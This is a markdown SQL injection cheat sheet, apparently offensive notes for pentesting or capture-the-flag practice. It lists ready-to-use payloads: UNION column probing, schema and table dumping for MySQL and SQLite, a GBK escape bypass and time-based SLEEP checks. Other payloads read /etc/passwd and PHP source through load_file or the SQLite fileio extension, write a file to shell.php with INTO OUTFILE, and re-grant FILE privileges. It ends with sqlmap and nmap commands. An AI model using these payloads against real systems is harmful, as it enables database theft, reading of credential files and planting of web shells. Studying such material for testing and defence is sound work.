# SQL injection

## Comments
MySQL interprets `#` and `--` as the beginning of comments

## Identifying the vulnerability
Quotes are always a good way to start
### Union based
##### Identitfy the number of parameters retrieved from the legal request

```sql
0 UNION SELECT null,null                # ERROR
0 UNION SELECT null,null,null           # ERROR
0 UNION SELECT null,null,null,null      # ERROR
0 UNION SELECT null,null,null,null,null # Returns a valid response
```

# Versions

## MySQL

```sql
select @@version
```

# Schemas
*MySQL*
```sql
SELECT DISTINCT table_schema FROM information_schema.tables;
```
# Tables
*MySQL*
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='SCHEMA_NAME_HERE';
```

*SQLite3*
```sql
SELECT tbl_name FROM sqlite_master
```

### Dumping columns
*MySQL*
```sql
SELECT column_name FROM information_schema.columns WHERE table_schema='SCHEMA_NAME_HERE' AND table_name='TABLE_NAME_HERE';
```
*SQLite3*
```sql
SELECT name FROM PRAGMA_TABLE_INFO('TABLE_NAME_HERE');
```

## Concat

**Mysql**
```sql
SELECT group_concat('0x7C',username,'0x7C') FROM users;
```

# GBK

SQL injection may appears when using GBK encoding. If `'` are escaped with a `\`, we can use GBK encoding to insert a value before the `'` so the payload looks like `something\'`. 
The point is that some GBK chars are like XX5C where 5C is the hex value of `\`. 

So the injection may be interpreted as `縗'` (GBK value of 0xbf5c27 a.k.a `¿\'` in ASCII ) and so the quote is not escaped anymore



# Bypasses

### Bypass simple quotes
*SQLite3*
- using hex(hex()), cast and substr() functions
```sql
SELECT tbl_name FROM sqlite_master WHERE hex(substr(tbl_name,1,1))=(SELECT CAST ($41$ AS TEXT)
```

MySQL
```sql
SELECT HEX('/etc/passwd');
-- 0x2F6574632F706173737764
-- and then select load_file(0x2F6574632F706173737764);
```

## Useful functions
```sql
group_concat()
substr("string",INDEX,LENGTH)
hex()
cast(integer AS TEXT)
cast("0123" as INT)
```


## Time based SQLi 
This happens when nothing is returned by the request.
If the request come back after a given time, it worked.

```sql
SELECT SLEEP(5);
SELECT SLEEP(5),null,null;
```

# MySQL File Reading

Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

If the database user has read permission (which most of the time it does), it is possible for an attacker to read the internal file of the server, with a small caviat that the absolute path must be known (just as a normal LFI).
In order to perform this kind of attack, the following function must be used:  

```sql
load_file(/path/to/file)
```

For example, the most basic approach is to read /etc/passwd:  
```sql
load_file('../etc/passwd')
```

A simple usage of the query:  
```
http://domain.com/index.php?id=1' Union Select 1,2,3,load_file('/etc/passwd'),5,6,7,8,9,10,11,12-- -
```

Alternatively you can convert **/etc/passwd** in 0xHex Format (in case WAF blocks it, or the backslashes might break up the syntax:  
```sql
load_file(0x2F6574632F706173737764) -- SELECT HEX('/etc/passwd')
```

Just like normal LFI, it is possible to convert the content of the file in base64, thanks to **TO_base64()** function:  

```sql
TO_base64(LOAD_FILE('/var/www/html/index.php'))  
```

You can also use **hex()** function in configuration files especially, when some characters are non-readable and might break the execution of the query:  
```sql
hex(load_file('/etc/passwd'))
```

It is possible to read the content of the file and copy it somewhere else where it's accessible to read:  
```SQL
load_file('/etc/passwd') INTO OUTFILE '/var/www/html/shell.php'--
```

If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

**TIPS :**
- `SELECT @@secure_file_priv` can help retrieved a path to a php file that connects to the db
# SQLite File Reading/Writing

SQLite does not support file I/O operations by default (anywhere else than in the CLI). However, you can easily enable them using the `sqlean-fileio` extension.

## CLI

While `readfile` function gets the job done, it only works in SQLite command-line interface (sqlite.exe).

```sql
SELECT readfile('/etc/passwd')
```

## Everywhere else 

Requirements : https://github.com/nalgeon/sqlean/blob/main/docs/fileio.md

**Install** 
- Download the zip file at `https://sqlpkg.org/?q=sqlean`
- Unzip it
- and run
```sqlite
.load ./fileio.so
```

**Payloads**
```sql
-- Read a file
select fileio_read('/etc/passwd');
-- Read a file with offset
select fileio_read('/etc/passwd',OFFSET_INT_HERE);
-- Read a file line by line
select rowid, value, name from fileio_scan('/etc/passwd');
-- List a directory item by item
select * from fileio_ls('./');
-- Write to file 
select fileio_write('hello.txt', 'hello world');
-- Append to file 
select fileio_append('hello.txt', 'hello world');
-- other functions
fileio_ls()
fileio_mkdir()
fileio_symlink()
```

## TOOLS :
- SQLmap
It needs to capture a request with burp and put it in request.txt
```bash
sqlmap -r request.txt --dbms-mysql --dump
```

- Nmap
```bash
nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 <host>
```



# Resources : 


- https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
- https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202009%20-%20Advanced%20SQL%20injection%20whitepaper.pdf?_gl=1*1dv8t5m*_ga*MTYxMDQ3MzgyMC4xNzE4MzU2NTIx*_ga_SRYSKX09J7*MTcyMDI1NDcyMC4zNC4xLjE3MjAyNTUzMzUuMC4wLjA.

